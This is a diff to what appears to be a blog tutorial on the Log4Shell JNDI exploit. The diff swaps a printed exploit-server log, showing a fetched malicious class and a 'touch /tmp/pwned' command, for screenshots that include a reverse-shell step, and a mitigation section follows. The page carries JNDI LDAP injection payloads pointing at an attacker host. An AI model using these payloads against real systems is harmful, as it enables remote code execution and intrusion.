@@ -335,20 +335,15 @@ ${jndi:ldap://${main:bar}.domain.com/j}
 4. We just need to inject the payload.<br><code>${jndi:ldap://YOUR_PUBLIC_IP:1389/Basic/Command/Base64/BASE64_ENCODED_COMMAND}</code><br><br>
 5. we’ll encode our command in base64:<br><br>  
    <img src="img/blog/step4.jpg" class="img-fluid" alt="step4"/> <br>
-6. You can see the hit like below:<pre><code>
-[+] LDAP Server Start Listening on 1389...
-[+] HTTP Server Start Listening on 8888...
-[+] Received LDAP Query: Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo
-[+] Paylaod: command
-[+] Command: touch /tmp/pwned
+6. <br>
+   <img src="img/blog/1.jpg" class="img-fluid" alt="1"/> <br>
     
-[+] Sending LDAP ResourceRef result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo with basic remote reference payload
-[+] Send LDAP reference result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo redirecting to http://192.168.1.143:8888/Exploitjkk87OnvOH.class
-[+] New HTTP Request From /192.168.1.143:50119  /Exploitjkk87OnvOH.class
-[+] Receive ClassRequest: Exploitjkk87OnvOH.class
-[+] Response Code: 200
-    </code></pre><br>
+7. You can see the hit like below:<br>
+    <img src="img/blog/2.jpg" class="img-fluid" alt="2"/> <br>
     
+8. Reverse Shell:
+  <img src="img/blog/3.jpg" class="img-fluid" alt="3"/> <br> 
+
                     <h2>6.<u>Mitigation</u></h2>
                     <img src="img/blog/jndi-attack.jpeg " class="img-fluid" alt="mitigation"/><br />
     1. <b>SPOT VULNERABLE APPLICATIONS</b><br>
